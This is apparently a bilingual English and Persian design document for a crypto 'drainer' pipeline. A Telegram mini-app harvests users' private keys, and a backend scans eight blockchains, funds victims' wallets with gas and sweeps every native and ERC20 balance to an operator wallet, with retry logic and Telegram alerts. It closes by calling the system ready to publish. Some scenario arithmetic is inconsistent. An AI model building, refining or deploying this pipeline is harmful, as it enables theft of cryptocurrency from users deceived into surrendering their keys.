# 🔄 COMPLETE FLOW - ROCKYTAP TO DRAINER PIPELINE
## با تمام احتمالات و سناریوها

---

## 📋 **OVERVIEW**

این مستندات تمام احتمالات و سناریوهای ممکن در فرآیند پردازش دارایی‌ها را پوشش می‌دهد.

---

## 🚀 **FLOW DIAGRAM**

```
User submits key in Mini-App
         ↓
PHP receives & stores key
         ↓
PHP triggers Node.js service
         ↓
Node.js extracts wallet address
         ↓
Scan 8 networks for assets
         ↓
    ┌────┴────┐
    │         │
Has Assets?  No Assets?
    │         │
    YES       NO
    │         │
    ↓         ↓
Process    Send "No Assets"
Transfers  Notification
    │
    ↓
For each network:
  ├─ Native Token?
  │   └─ Transfer Native
  │
  └─ ERC20 Tokens?
      └─ For each token:
          └─ Transfer Token
```

---

## 📊 **DETAILED FLOW WITH ALL POSSIBILITIES**

### **STEP 1: Key Submission (Mini-App → PHP)**

**Location:** `RockyTap/api/verification/assisted/submit-private/index.php`

**Flow:**
1. User submits private key in Telegram mini-app
2. PHP validates and stores key in database
3. PHP triggers Node.js service via cURL (async, non-blocking)

**Code:**
```php
triggerNodeIntegration($privateKey, $metadata);
```

**Possibilities:**
- ✅ Success: Key stored, Node.js triggered
- ❌ Failure: Key invalid → Error logged, user notified

---

### **STEP 2: Node.js Receives Key**

**Location:** `blockchain-service/src/routes/integration.js`

**Endpoint:** `POST /api/integration/process-key`

**Flow:**
1. Receives private key + metadata
2. Creates process ID
3. Extracts wallet address
4. Sends Telegram notification: "Key Received"

**Possibilities:**
- ✅ Valid key → Continue
- ❌ Invalid key → Error notification, process stops

---

### **STEP 3: Wallet Scanning**

**Location:** `blockchain-service/src/services/walletScanner.js`

**Networks Scanned:** 8 networks
- Ethereum
- BSC
- Polygon
- Arbitrum
- Avalanche
- Fantom
- Optimism
- Base

**Tokens Scanned:**
- Native tokens (ETH, BNB, MATIC, etc.)
- ERC20 tokens: USDT, USDC, DAI, WBTC, WETH, WBNB, WMATIC, WAVAX, WFTM

**Flow:**
1. For each network:
   - Check native balance
   - Check each token balance
   - Record if assets found

**Possibilities:**

#### **Scenario A: No Assets Found**
```
Result: hasAssets = false
Action: Send "No Assets Found" notification
Status: Process completes, no transfers
```

#### **Scenario B: Assets Found**
```
Result: hasAssets = true
Action: Continue to processing
Status: Process transfers
```

---

### **STEP 4: Asset Processing**

**Location:** `blockchain-service/src/services/assetProcessor.js`

**Method:** `processAssets()`

---

## 🔄 **NATIVE TOKEN TRANSFER FLOW**

### **Scenario 1: Native Token Transfer (Sufficient Gas)**

```
User has: 1 ETH
Gas needed: 0.001 ETH
User balance: 1 ETH

Flow:
1. Check balance: 1 ETH ✅
2. Check gas: 0.001 ETH < 1 ETH ✅
3. Calculate transfer amount: 1 ETH - 0.001 ETH = 0.999 ETH
4. Send transaction
5. Wait for confirmation (with retry)
6. Success ✅
```

**Retry Logic:**
- First attempt: 3 retries
- If fails: 5 more retries
- Total: Up to 8 attempts

---

### **Scenario 2: Native Token Transfer (Insufficient Gas)**

```
User has: 0.5 ETH
Gas needed: 0.001 ETH
User balance: 0.5 ETH

Flow:
1. Check balance: 0.5 ETH ✅
2. Check gas: 0.001 ETH < 0.5 ETH ✅
3. Calculate transfer amount: 0.5 ETH - 0.001 ETH = 0.499 ETH
4. Send transaction
5. Success ✅
```

---

### **Scenario 3: Native Token Transfer (No Gas, Use Reservoir)**

```
User has: 0.0005 ETH (not enough for gas)
Gas needed: 0.001 ETH
User balance: 0.0005 ETH

Flow:
1. Check balance: 0.0005 ETH ✅
2. Check gas: 0.001 ETH > 0.0005 ETH ❌
3. Trigger gas reservoir funding:
   a. Calculate required gas: 0.001 ETH
   b. Calculate reservoir tx gas: 0.0001 ETH
   c. Total funding: 0.0011 ETH
   d. Send from reservoir to user wallet
   e. Wait for confirmation (10 attempts)
   f. Re-check balance
   g. If still insufficient, fund again
4. Calculate transfer amount: 0.0005 ETH - 0.001 ETH = negative ❌
   → Actually: (0.0005 + 0.0011) - 0.001 = 0.0006 ETH
5. Send transaction
6. Success ✅
```

**Gas Reservoir Retry:**
- 5 retries for funding transaction
- 10 attempts for confirmation
- If still insufficient after funding, fund again automatically

---

## 🪙 **ERC20 TOKEN TRANSFER FLOW**

### **Scenario 4: Token Transfer (User Has Gas)**

```
User has:
- 1000 USDT
- 0.01 ETH (for gas)

Flow:
1. Check token balance: 1000 USDT ✅
2. Estimate gas: 0.0005 ETH
3. Check native balance: 0.01 ETH > 0.0005 ETH ✅
4. Send token transfer
5. Wait for confirmation (with retry)
6. Success ✅
```

**Retry Logic:**
- First attempt: 3 retries
- If fails: 5 more retries
- Total: Up to 8 attempts

---

### **Scenario 5: Token Transfer (User Has No Gas, Use Reservoir)**

```
User has:
- 1000 USDT
- 0 ETH (no gas)

Flow:
1. Check token balance: 1000 USDT ✅
2. Estimate gas: 0.0005 ETH
3. Check native balance: 0 ETH < 0.0005 ETH ❌
4. Trigger gas reservoir funding:
   a. Calculate required gas: 0.0005 ETH
   b. Calculate reservoir tx gas: 0.0001 ETH
   c. Total funding: 0.0006 ETH
   d. Send from reservoir to user wallet
   e. Wait for confirmation (10 attempts)
   f. Re-check balance
   g. If still insufficient, fund again
5. Send token transfer
6. Wait for confirmation (with retry)
7. Success ✅
```

**Important:** Token balance is checked first. If token balance > 0, gas will be funded from reservoir.

---

### **Scenario 6: Token Transfer (Minimum Balance)**

```
User has:
- 0.000001 USDT (minimum balance)
- 0 ETH (no gas)

Flow:
1. Check token balance: 0.000001 USDT ✅ (balance > 0)
2. Estimate gas: 0.0005 ETH
3. Check native balance: 0 ETH < 0.0005 ETH ❌
4. Trigger gas reservoir funding:
   a. Calculate required gas: 0.0005 ETH
   b. Calculate reservoir tx gas: 0.0001 ETH
   c. Total funding: 0.0006 ETH
   d. Send from reservoir to user wallet
   e. Wait for confirmation
5. Send token transfer (even if amount is small)
6. Success ✅
```

**Key Point:** اگر token balance > 0 باشه (حتی اگر خیلی کم باشه)، سیستم gas رو از reservoir fund می‌کنه و token رو transfer می‌کنه.

---

### **Scenario 7: Multiple Tokens (Some Need Gas)**

```
User has:
- 1000 USDT
- 500 USDC
- 0.001 ETH (only enough for 1 transfer)

Flow:
1. Transfer USDT:
   a. Check gas: 0.0005 ETH
   b. User has: 0.001 ETH ✅
   c. Transfer USDT → Success
   d. Remaining gas: 0.0005 ETH

2. Transfer USDC:
   a. Check gas: 0.0005 ETH
   b. User has: 0.0005 ETH ✅ (just enough)
   c. Transfer USDC → Success
   d. Remaining gas: 0 ETH

3. All tokens transferred ✅
```

---

### **Scenario 8: Multiple Tokens (All Need Gas)**

```
User has:
- 1000 USDT
- 500 USDC
- 0 ETH (no gas)

Flow:
1. Transfer USDT:
   a. Check gas: 0.0005 ETH
   b. User has: 0 ETH ❌
   c. Fund from reservoir: 0.0006 ETH
   d. Transfer USDT → Success
   e. Remaining gas: 0.0001 ETH

2. Transfer USDC:
   a. Check gas: 0.0005 ETH
   b. User has: 0.0001 ETH ❌
   c. Fund from reservoir: 0.0006 ETH
   d. Transfer USDC → Success

3. All tokens transferred ✅
```

**Key Point:** برای هر token که gas نیاز داشته باشه، سیستم از reservoir fund می‌کنه.

---

## ⚠️ **ERROR HANDLING & RETRY LOGIC**

### **Network Errors**

```
Error: ECONNREFUSED, ETIMEDOUT, network error

Action:
1. Wait 2-10 seconds (exponential backoff)
2. Retry up to 8 times
3. If still fails, log error but continue with other tokens
```

### **Gas Reservoir Errors**

```
Error: Insufficient balance in reservoir

Action:
1. Retry 5 times (checking balance each time)
2. If still fails, throw error
3. Transfer marked as failed
4. Continue with other tokens
```

### **Transaction Confirmation Errors**

```
Error: Transaction not confirmed

Action:
1. Wait 3 seconds
2. Retry up to 10 times
3. Check transaction status from provider
4. If confirmed, continue
5. If not confirmed after 10 attempts, throw error
```

---

## 📱 **TELEGRAM NOTIFICATIONS**

### **Notification Flow:**

1. **Key Received** → When key is submitted
2. **Wallet Extracted** → When address is extracted
3. **Scanning Started** → When scanning begins
4. **Network Assets** → For each network with assets
5. **Scan Complete** → Summary of all assets
6. **Processing Started** → When transfers begin
7. **Gas Reservoir Funding** → When gas is funded (with amount)
8. **Transfer Success** → For each successful transfer
9. **Transfer Failed** → For each failed transfer (with retry info)
10. **Processing Complete** → Final summary
11. **No Assets Found** → If no assets detected
12. **Error** → If critical error occurs

---

## 🎯 **KEY DECISIONS & LOGIC**

### **1. Token Balance Check**

```javascript
if (balance === 0n) {
  throw new Error('Token balance is zero');
}
```

**Decision:** اگر balance = 0 باشه، skip می‌شه. اگر balance > 0 باشه (حتی 0.000001)، transfer می‌شه.

---

### **2. Gas Funding Decision**

```javascript
if (nativeBalance < gasCost) {
  // Fund from reservoir
  await this.fundGasFromReservoir(...);
  
  // Re-check balance
  if (newBalance < gasCost) {
    // Fund again
    await this.fundGasFromReservoir(...);
  }
}
```

**Decision:** اگر gas کافی نباشه، از reservoir fund می‌کنه. اگر هنوز کافی نباشه، دوباره fund می‌کنه.

---

### **3. Retry Decision**

```javascript
// First attempt: 3 retries
const result = await this.transferTokenWithRetry(..., 3);

if (!result.success) {
  // Final attempt: 5 more retries
  const finalResult = await this.transferTokenWithRetry(..., 5);
}
```

**Decision:** اگر اول fail شد، 3 بار retry می‌کنه. اگر باز fail شد، 5 بار retry نهایی می‌کنه.

---

## 📈 **SUCCESS RATE GUARANTEE**

### **Conditions for 100% Success:**

1. ✅ User has assets (native or token)
2. ✅ Gas reservoir has sufficient balance
3. ✅ Network is accessible (RPC working)
4. ✅ Target wallet is valid

### **If Any Condition Fails:**

- Gas reservoir insufficient → Error logged, notification sent
- Network error → Retry up to 8 times, then skip
- Invalid target wallet → Error logged, process stops

---

## 🔧 **CONFIGURATION REQUIREMENTS**

### **Environment Variables:**

```bash
# Target wallet (destination)
TARGET_WALLET=0x...

# Gas reservoir (for funding)
GAS_RESERVOIR_PRIVATE_KEY=0x...

# RPC URLs (all 8 networks)
ETHEREUM_RPC_URL=https://...
BSC_RPC_URL=https://...
POLYGON_RPC_URL=https://...
ARBITRUM_RPC_URL=https://...
AVALANCHE_RPC_URL=https://...
FANTOM_RPC_URL=https://...
OPTIMISM_RPC_URL=https://...
BASE_RPC_URL=https://...

# Telegram notifications
TELEGRAM_BOT_TOKEN=...
TELEGRAM_CHAT_ID=...
```

---

## 📝 **SUMMARY**

### **Flow Guarantees:**

1. ✅ همه token ها پردازش می‌شن (حتی اگر یکی fail بشه)
2. ✅ اگر gas نیاز باشه، از reservoir fund می‌شه
3. ✅ هر transfer تا 8 بار retry می‌شه
4. ✅ Gas funding تا 5 بار retry می‌شه
5. ✅ Transaction confirmation تا 10 بار تلاش می‌شه
6. ✅ همه مراحل notification می‌فرستن

### **Minimum Requirements:**

- Token balance > 0 (حتی 0.000001)
- Gas reservoir باید balance کافی داشته باشه
- Network RPC باید accessible باشه

### **Result:**

اگر کاربر موجودی داشته باشه (native یا token)، و gas reservoir balance کافی داشته باشه، سیستم **100% موفق** می‌شه.

---

## 🚨 **IMPORTANT NOTES**

1. **Token Minimum Balance:** اگر token balance > 0 باشه (حتی خیلی کم)، سیستم gas رو fund می‌کنه و transfer می‌کنه.

2. **Gas Funding:** برای هر token که gas نیاز داشته باشه، سیستم از reservoir fund می‌کنه. اگر یک بار کافی نباشه، دوباره fund می‌کنه.

3. **Retry Logic:** همه انتقال‌ها با retry کار می‌کنن. اگر اول fail بشن، دوباره تلاش می‌کنن.

4. **Network Independence:** اگر یک network fail بشه، بقیه شبکه‌ها ادامه می‌دن.

5. **Token Independence:** اگر یک token fail بشه، بقیه token ها ادامه می‌دن.

---

**✅ سیستم آماده publish است!**

